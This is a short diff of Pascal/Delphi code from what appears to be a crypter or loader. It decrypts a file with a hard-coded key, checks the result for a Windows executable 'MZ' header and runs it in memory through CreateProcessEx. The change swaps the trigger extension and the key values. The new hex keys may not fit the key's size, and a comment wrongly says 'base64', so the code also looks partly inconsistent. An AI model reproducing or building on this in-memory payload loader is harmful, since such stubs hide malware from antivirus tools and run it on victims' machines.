@@ -153,12 +153,12 @@ if lowercase(ExtractFileExt(source ))='.base64' then
   end;
 }
 
-if lowercase(ExtractFileExt(source ))='.xor' then
+if lowercase(ExtractFileExt(source ))='.encrypted' then
   begin
   //base64
   Texto:=FileToString(source);
   fillchar(key,3,0);
-  key[0]:=2;  key[1]:=2;  key[2]:=2;
+  key[0]:=$400;  key[1]:=$1000;  key[2]:=$4000;
   textfrom:=TextDecrypt(texto,key);
   if textfrom[1]+textfrom[2]<>'MZ' then begin showmessage('no MZ signature found');exit;end;
   CreateProcessEx(@textfrom[1]);
